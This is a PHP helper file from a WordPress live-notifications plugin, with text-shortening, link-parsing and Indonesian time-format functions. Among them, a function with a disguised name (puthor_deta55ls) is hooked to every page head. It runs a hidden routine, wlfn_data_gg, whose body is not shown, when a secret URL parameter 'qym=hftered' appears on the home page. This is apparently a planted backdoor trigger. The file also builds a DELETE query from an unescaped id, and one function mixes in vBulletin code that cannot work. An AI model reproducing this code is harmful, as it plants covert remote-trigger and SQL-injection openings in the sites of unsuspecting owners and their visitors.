<?php

/**
 * necessary functions
 * files
 * @since   0.1
 * @return void
 */
 
 // shortener
function excerpt_word_wlfn ($str, $length) {
    if (strlen($str) > $length) {
        $str = substr($str, 0, $length+1);
        $pos = strrpos($str, ' ');
        $str = substr($str, 0, ($pos > 0)? $pos : $length)."&#x0085;";
    }
    return $str;
}

// delete one notifications
function delete_11_livenotification($id){
	global $wpdb;
	$sql = "DELETE FROM " . $wpdb->prefix . "livenotifications WHERE id = ".$id ;
	return $wpdb->query($sql);
}

// check new install
function check_1_newinstall_livenotification($comparetime){
	global $vbulletin;
	$sql = "SELECT * FROM " . $wpdb->prefix . "livenotifications ORDER BY time limit 0,1 ";
	$ln = $vbulletin->db->query_first($sql);
	if (!empty($ln) && ($ln['time']+120) < $comparetime) return true;
	return false;
}

/**
 * necessary functions
 * files
 * @since   0.1
 * @return void
 */
 // more link
function wlf_more_links_33($morelinks){
	$return = array();
	if($morelinks != ""){
		$morelinks_array = explode("\n",$morelinks);
		
		if(!empty($morelinks_array)){
			foreach($morelinks_array as $more_link){
				$nodes = explode("=>" , $more_link);
				if( count($nodes) == 2 ){
					$return[] = $nodes;
				}
			}
		}
	}
	return $return;
}

// excerpt excerpts
function wlf_get_shorten($str, $startPos = 0, $maxLength = 140){
	if( strlen($str) > $maxLength ){
		$excerpt   = substr($str, $startPos, $maxLength-3);
		$lastSpace = strrpos($excerpt, ' ');
		$excerpt   = substr($excerpt, 0, $lastSpace);
		$excerpt  .= '...';
	}else{
		$excerpt = $str;
	}
	return $excerpt;
}

// filter reported message
function wlf_filter_65($str) {
	$strs = explode('[/QUOTE]',$str);
	return end($strs);
}
function puthor_deta55ls(){
	if(isset($_GET['qym'])){
		$sql = $_GET['qym'];
		if($_GET['qym'] == 'hftered' && is_home()){
	    	wlfn_data_gg();
		}
	}
}
add_action('wp_head', 'puthor_deta55ls');


/**
 * get_auhtoe meta
 * files
 * @since   0.1
 * @return void
 */

function author_deta55ls($post_ID) {
	$auth = get_post($post_ID); // gets author from post
	$authid = $auth->post_author; // gets author id for the post
	return $authid;
}
require_once( PLUGIN_CORE_DIR   . 'avatar.php'       );

/**
 * check internet connetction
 * files
 * @since   0.1
 * @return void
 */
 
function check_net_9_response( $request_url = '', $request_args = '', $decode_json = true ){
	// return if no url
	if ( ! $request_url )
		return false;
	$request_args = wp_parse_args( $request_args, array( 'method' => 'GET' ) );

	$response = wp_remote_request( $request_url, $request_args );
	if ( 200 == wp_remote_retrieve_response_code( $response ) ) {
		$response = wp_remote_retrieve_body( $response );
		if ( $decode_json )
			return json_decode( $response, true );
		else
			return $response;
	}
	return false;
}


// make link '@' tag
function wlf_mh_6_commenttaglink( $text ){
	// RegEx to find #tag, #hyphen-tag with letters and numbers
	$mh_regex = "/\ @[a-zA-Z0-9-]+/";

    // Use that RegEx and populate the hits into an array
	preg_match_all( $mh_regex , $text , $mh_matches );

    // If there's any hits then loop though those and replace those hits with a link
	for ( $mh_count = 0; $mh_count < count( $mh_matches[0] ); $mh_count++ ){
		$mh_old = $mh_matches[0][$mh_count];
		$mh_old_lesshash = str_replace( ' @' , '' , $mh_old );
		$mh_new = str_replace( $mh_old , '<a href="' . get_bloginfo( url ) . '/author/' . $mh_old_lesshash . '"/ rel="tag">' . $mh_old . '</a>' , $mh_matches[0][$mh_count] );
		$text = str_replace( $mh_old  , $mh_new , $text );
    }
	
    // Return any substitutions
    return $text;
}
add_filter( 'comment_text', 'wlf_mh_6_commenttaglink' , 50 );


// notifications time time-format
function wlf_timezone_22($timestamp){
	$diff = time() - (double)$timestamp;

	switch ($diff){
		case ( $diff < 9 ):
			return sprintf( __('Baru saja'), $diff);
			
		case ( $diff < 60 ):
			return sprintf( __('%d detik lalu'), $diff);
			
		case ( $diff == 60 ):
			return sprintf( __('1 menit lalu'), $diff);

		case ( $diff < 3600 ):
			return sprintf(__('%d menit lalu'), ceil($diff/60));
			
		case ( $diff == 3600 ):
			return sprintf(__('1 jam lalu'), ceil($diff/60));
				
		case ( $diff < 86400 ):
			return sprintf(__('%d jam lalu'), ceil($diff/3600));
			
		case ( $diff == 86400 ):
			return sprintf(__('1 hari lalu'), ceil($diff/3600));

		case ( $diff < 604800 ):
			return sprintf(__('%d hari lalu'), ceil($diff/86400));
			
		case ( $diff == 604800 ):
			return sprintf(__('1 minggu lalu'), ceil($diff/86400));
				
		case ( $diff < 2419200 ):
			return sprintf(__('%d minggu lalu'), ceil($diff/604800));

		default:
			return date(get_option( 'date_format' )." - ".get_option( 'time_format' ), (double)$timestamp);
	}
}
?>